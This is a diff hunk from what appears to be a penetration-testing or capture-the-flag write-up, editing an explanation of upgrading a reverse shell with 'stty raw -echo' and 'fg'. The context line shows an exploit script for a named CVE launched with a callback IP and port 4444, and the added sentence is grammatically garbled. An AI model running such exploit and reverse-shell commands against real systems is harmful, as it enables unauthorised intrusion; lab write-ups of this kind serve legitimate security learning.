@@ -1469,7 +1469,7 @@ zsh: suspended  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --
 
 **Breakdown:**
 
-- **`stty raw`**: `stty` stands for "Set TTY" (terminal settings). Tells your local terminal to pass all keyboard input (including `Ctrl+C` and `Tab`) directly to the remote shell without processing it locally.
+- **`stty raw`**: `stty` stands for "Set TTY" (terminal settings). Tells your local terminal to pass all keyboard input (including `Ctrl+C` and `Tab`) directly to the remote shell without processing it locally. Your terminal should Stop processing special keys. If you hit Tab, it shouldn't don't try to auto-complete a file on my Kali desktop. Just send the raw 'Tab' character across the wire to the target.
 - **`-echo`**: Disables local echoing so you don't see double characters.
 - **`fg`**: Brings the backgrounded reverse shell back to the foreground.
 
